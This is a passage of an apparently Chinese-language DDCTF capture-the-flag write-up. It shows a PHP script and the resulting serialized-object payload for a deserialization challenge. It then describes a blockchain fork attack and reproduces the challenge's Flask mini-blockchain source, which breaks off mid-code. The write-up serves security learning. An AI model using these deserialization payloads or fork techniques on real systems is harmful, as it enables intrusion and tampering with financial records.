<p>这个反序列执行链很简单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line">&#123;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FlagGet</span><span class="params">($user)</span></span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$t =  <span class="keyword">new</span> Test();</div><div class="line">$t-&gt;fl = <span class="keyword">new</span> Flag();</div><div class="line">$t-&gt;user_uuid = <span class="string">"c09764a2-8d31-4643-907a-5d663b9348dc"</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($t);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>生成 <code>O:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}}</code> 不过要把类名称改成<code>&quot;Index\Helper\Flag&quot;, &quot;Index\Helper\SQL&quot;,&quot;Index\Helper\Test&quot;</code>这种形式才能在远程环境执行。<br>最后的payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>有关于区块链的代码审计，也是第一次接触到区块链的具体原理，分析了一天，收获蛮大的，这边其实可以利用<strong>区块链分叉攻击</strong>来实现bank未被hack掉的区块链链路（只要这个链路比被hack掉的链路长就可以了。）</p>
<p>mini区块链源码如下（对学习区块链还是挺有意思）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></div><div class="line"><span class="comment"># written in python 2.7</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">app.secret_key = <span class="string">'*********************'</span></div><div class="line">url_prefix = <span class="string">'/b9744af30897e'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</div><div class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</div><div class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</div><div class="line"></div><div class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></div><div class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></div><div class="line">    hexed = hex(pubkey.n)</div><div class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</div><div class="line">    <span class="keyword">return</span> hexed</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></div><div class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</div><div class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</div><div class="line"></div><div class="line">bank_address, bank_privkey = gen_addr_key_pair()</div><div class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</div><div class="line">shop_address, shop_privkey = gen_addr_key_pair()</div><div class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line">my_address, my_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></div><div class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</div><div class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">    <span class="keyword">return</span> utxo</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</div><div class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</div><div class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</div><div class="line">    ])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></div><div class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</div><div class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    <span class="keyword">return</span> tx</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</div><div class="line">    nonce = str(nonce_str)</div><div class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</div><div class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</div><div class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</div><div class="line">    <span class="keyword">return</span> block</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></div><div class="line">    curr_block = blockchain_tail</div><div class="line">    blockchain = [curr_block]</div><div class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</div><div class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</div><div class="line">        blockchain.append(curr_block)</div><div class="line">    blockchain = blockchain[::<span class="number">-1</span>]</div><div class="line">    utxos = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</div><div class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</div><div class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</div><div class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</div><div class="line">    <span class="keyword">return</span> utxos</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></div><div class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</div><div class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></div><div class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</div><div class="line">    <span class="keyword">return</span> balance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></div><div class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</div><div class="line">    <span class="comment"># print session['blocks']</span></div><div class="line">    <span class="comment"># print ['prev']</span></div><div class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</div><div class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</div><div class="line">    new_utxo_ids = set()</div><div class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</div><div class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</div><div class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</div><div class="line">        tot_input = <span class="number">0</span></div><div class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</div><div class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</div><div class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</div><div class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</div><div class="line">            <span class="keyword">print</span> utxos</div><div class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</div><div class="line">            utxo = utxos[utxo_id]</div><div class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</div><div class="line">            tot_input += utxo[<span class="string">'amount'</span>]</div><div class="line">            <span class="keyword">del</span> utxos[utxo_id]</div><div class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</div><div class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    </div><div class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</div><div class="line">    <span class="comment"># print block['hash']</span></div><div class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</div><div class="line">    <span class="comment"># print block_hash</span></div><div class="line">    <span class="comment"># print difficulty</span></div><div class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</div><div class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</div><div class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</div><div class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</div><div class="line">    session.modified = <span class="keyword">True</span></div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</div><div class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</div><div class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></div><div class="line">    </div><div class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></div><div class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</div><div class="line">        <span class="comment"># print "lalala:"+str(total_currency_issued)</span></div><div class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></div><div class="line">        <span class="comment"># print genesis_transaction</span></div><div class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</div><div class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</div><div class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></div><div class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</div><div class="line">        </div><div class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></div><div class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</div><div class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</div><div class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</div><div class="line">        append_block(second_block)</div><div class="line">        </div><div class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></div><div class="line">		</div><div class="line"></div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</div><div class="line">        append_block(third_block)</div><div class="line"></div><div class="line">		<span class="comment"># final</span></div><div class="line">        <span class="comment"># handout2 = create_output_utxo(hacker_address, 1)</span></div><div class="line">        <span class="comment"># transferred = create_tx([total_currency_issued['id']], [handout2], bank_privkey)</span></div><div class="line">		</div><div class="line">        <span class="comment"># fake_second_block = create_block(genesis_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># requests.post(url="http://127.0.0.1:5000/b9744af30897e/create_transaction",data=json.dumps(fake_second_block),proxies = &#123;"http":"http://127.0.0.1:8080"&#125;,headers=&#123;"Content-Type":"application/json"&#125;) </span></div><div class="line">        <span class="comment"># append_block(fake_second_block)</span></div><div class="line">        <span class="comment"># fake_third_block = create_block(fake_second_block['hash'], "aaaa", [])</span></div><div class="line">        <span 